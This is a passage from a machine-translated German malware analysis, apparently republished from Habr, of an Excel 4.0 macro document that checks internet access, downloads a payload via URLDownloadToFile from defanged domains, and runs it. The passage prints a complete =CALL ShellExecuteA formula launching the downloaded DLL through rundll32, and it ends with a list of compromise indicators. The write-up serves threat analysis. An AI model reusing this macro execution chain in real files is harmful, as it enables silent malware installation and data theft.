Diese Aktionen zielen hÃ¶chstwahrscheinlich darauf ab, zu Ã¼berprÃ¼fen, ob die Umgebung, in der das Dokument ausgefÃ¼hrt wird, Ã¼ber einen Internetzugang verfÃ¼gt. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In der Formel wird die Funktion FILES an iserror Ã¼bergeben, und das Argument ist der Name der Datei, in die das Ergebnis der Funktion URLDownloadToFile geschrieben werden soll: Die </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_u/rh/x1/_urhx1xm6fnl5wiaca1r1zojjba.png"><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zelle FM27223 steuert die Funktion zum SchlieÃŸen des Buches: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/f2/fj/ka/f2fjkalfq8wvjhotj8xyb8td5-g.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach erfolgreichem Empfang der Datei von Microsoft werden die Zellen gefÃ¼llt, um den zweiten Aufruf der URL urlmon vorzubereiten.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nutzlast wird geladen</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und hier ist der zweite Aufruf, aber an die DomÃ¤ne dehabadi [.] Ir, von der die bÃ¶swillige Last geladen werden soll: </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/3f/jx/db/3fjxdb9mshlwdu0y6xgnp0j_ena.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Das Ergebnis wird in eine Datei im selben Ordner mit der Erweiterung html geschrieben: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dh/py/vd/dhpyvdog5thduid5qvxiuclpa6s.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Als nÃ¤chstes stoÃŸen wir auf einen Zweig im Makrocode, wenn beim ersten Versuch, Nutzdaten herunterzuladen, fehlgeschlagen, wird ein zweiter Versuch unternommen, jedoch von einer anderen Adresse. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn der Download erfolgreich ist, wird ein Warn-Popup angezeigt und die geladene Bibliothek wird aufgerufen. </font></font><br>
 <br>
<img src="https://habrastorage.org/webt/uo/dn/gv/uodngvrubmpjcf-zkckbqj5wm-e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Der vollstÃ¤ndige Anruf lautet wie folgt:</font></font><br>
<br>
<pre><code class="plaintext hljs">=CALL("shell32","ShellExecuteA","JJCCJJ",0,"open","c:\windows\systemc32\rundll32.exe","c:\users\public\4hcFC.html,DllRegisterServer",0,5) </code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bei einem vollstÃ¤ndigen Aufruf wird die ShellExecuteA-Funktion aus der Shell32-Bibliothek mit Parametern zum Starten von rundll32 aufgerufen, mit denen die exportierte Funktion der heruntergeladenen schÃ¤dlichen Bibliothek aufgerufen wird. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Damit ist die Makrofunktion abgeschlossen, die Nutzlast ist betriebsbereit.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fazit</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wie bereits erwÃ¤hnt, ist die Technologie ziemlich alt ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Excel 4.0 fÃ¼r Windows 3.0 und 3.1</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), bietet jedoch die FunktionalitÃ¤t, die Malware benÃ¶tigt, um ihre Ziele zu erreichen. Der Zweck dieser Datei besteht darin, gefÃ¤hrliche Software stillschweigend in das System einzufÃ¼gen, die schwerwiegende SchÃ¤den verursachen kann, angefangen beim Diebstahl personenbezogener Daten Ã¼ber Autorisierungsdaten fÃ¼r Systeme bis hin zur BeschÃ¤digung / VerschlÃ¼sselung von Daten auf dem Computer und der MÃ¶glichkeit, Code remote auszufÃ¼hren. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
FÃ¼r die Analyse solcher Dokumente ist es Ã¼berhaupt nicht erforderlich, spezielle Dienstprogramme und Software zu verwenden. ErwÃ¤hnenswert ist jedoch eine Reihe von </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Oletools-</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Skripten. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;">Weitere Details finden Sie hier</font></a><font style="vertical-align: inherit;"> . Wir werden hier enden. Nachfolgend sind Indikatoren fÃ¼r Kompromisse aufgefÃ¼hrt, die als Ergebnis der Analyse identifiziert wurden. </font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Erhaltenes IOC:</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
evans [.] williamdmon [@] wp [.] pl </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
eleventalents [.] com </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
dehabadi [.] ir </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
hxxps: //eleventalents.com/wp-keys.php </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
hxxps: //dehabadi.ir/wp-keys.php </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
de88d3774ae006d96121d9b45efbf1ee </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
a73d1214740330013773cd733b0daf206eae2e03 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ba4adb640f777ad9b0881919e9bd1e171e64025d97a37fd585295ab611653419 </font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Eine vollstÃ¤ndige Liste der Kompromissindikatoren. </font></font></a><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Verweise:</font></font></b><br>
<br>
<ul>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Makroreferenz 4.0 </font></font></a> </li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Arbeitete an der Analyse: </font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Frolov Ilya </font></font></a><br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kolenchuk Alexey</font></font></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de504402/index.html">29. Mai Java Digest</a></li>
<li><a href="../de504408/index.html">Einfache und bequeme Testframework-Vorlage auf Selenide fÃ¼r UI-Autotests</a></li>
<li><a href="../de504412/index.html">Online-Programmiermeisterschaft "Open Finals of Moscow Training"</a></li>
<li><a href="../de504414/index.html">Wie Microsoft AppGet getÃ¶tet hat</a></li>
<li><a href="../de504420/index.html">Schreiben einer rundenbasierten PvP-Arena mit gleichzeitigen Bewegungen</a></li>
<li><a href="../de504434/index.html">Bildungsprogramm fÃ¼r Eltern: Wie man Kinder im Internet vor Gefahren schÃ¼tzt</a></li>
<li><a href="../de504438/index.html">30 Mitaps pro Woche. Wir erÃ¶ffnen die Sommersaison 2020</a></li>
<li><a href="../de504442/index.html">Ein bisschen Ã¼ber UmzÃ¼ge im Linux-Kernel</a></li>
<li><a href="../de504444/index.html">Verwenden von Docker mehrstufig zum Erstellen von Windows-Images</a></li>
<li><a href="../de504448/index.html">Gamers Generation II</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>